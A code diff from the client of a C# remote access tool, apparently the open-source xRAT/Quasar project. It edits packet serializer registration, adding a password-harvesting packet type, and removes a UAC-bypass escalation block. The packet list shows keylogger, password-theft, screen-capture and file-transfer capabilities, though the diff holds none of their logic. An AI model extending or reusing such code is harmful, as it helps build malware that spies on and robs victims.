@@ -6,6 +6,7 @@ using System.Windows.Forms;
 using xClient.Config;
 using xClient.Core;
 using xClient.Core.Commands;
+using xClient.Core.Data;
 using xClient.Core.Encryption;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
@@ -54,7 +55,7 @@ namespace xClient
         {
             ConnectClient = new Client();
 
-            ConnectClient.AddTypesToSerializer(typeof (IPacket), new Type[]
+            ConnectClient.AddTypesToSerializer(new Type[]
             {
                 typeof (Core.Packets.ServerPackets.GetAuthentication),
                 typeof (Core.Packets.ServerPackets.DoClientDisconnect),
@@ -86,8 +87,10 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.DoDownloadFileCancel),
                 typeof (Core.Packets.ServerPackets.GetKeyloggerLogs),
                 typeof (Core.Packets.ServerPackets.DoUploadFile),
+                typeof (Core.Packets.ServerPackets.GetPasswords),
                 typeof (Core.Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Core.Packets.ClientPackets.SetStatus),
+                typeof (Core.Packets.ClientPackets.SetStatusFileManager),
                 typeof (Core.Packets.ClientPackets.SetUserStatus),
                 typeof (Core.Packets.ClientPackets.GetDesktopResponse),
                 typeof (Core.Packets.ClientPackets.GetProcessesResponse),
@@ -100,7 +103,6 @@ namespace xClient
                 typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
                 typeof (Core.Packets.ClientPackets.GetKeyloggerLogsResponse),
                 typeof (Core.Packets.ClientPackets.GetPasswordsResponse),
-                typeof (Core.Packets.ServerPackets.GetPasswords),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (Core.ReverseProxy.Packets.ReverseProxyData),
@@ -123,15 +125,6 @@ namespace xClient
             SystemCore.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
             SystemCore.AccountType = SystemCore.GetAccountType();
             GeoLocationHelper.Initialize();
-
-            if (Settings.ENABLEUACESCALATION)
-            {
-                if (SystemCore.TryUacTrick())
-                    SystemCore.Disconnect = true;
-
-                if (SystemCore.Disconnect)
-                    return;
-            }
 
             if (!Settings.INSTALL || SystemCore.MyPath == SystemCore.InstallPath)
             {
